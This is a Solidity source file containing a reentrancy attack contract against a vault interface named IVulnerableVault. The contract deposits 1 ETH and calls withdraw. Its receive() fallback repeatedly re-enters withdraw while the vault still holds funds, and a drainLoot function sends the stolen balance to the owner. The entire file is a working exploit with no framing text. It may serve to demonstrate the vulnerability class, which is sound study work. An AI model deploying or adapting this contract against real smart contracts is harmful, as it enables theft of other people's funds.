// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
    function getVaultBalance() external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableVault public immutable targetVault;
    address public immutable owner;
    uint256 public constant INITIAL_DEPOSIT = 1 ether;

    constructor(address _targetVault) {
        targetVault = IVulnerableVault(_targetVault);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Nao autorizado");
        _;
    }

    function attack() external payable onlyOwner {
        require(msg.value >= INITIAL_DEPOSIT, "Aporte minimo de 1 ETH");
        targetVault.deposit{value: INITIAL_DEPOSIT}();
        targetVault.withdraw();
    }

    receive() external payable {
        if (address(targetVault).balance >= INITIAL_DEPOSIT) {
            targetVault.withdraw();
        }
    }

    function drainLoot() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
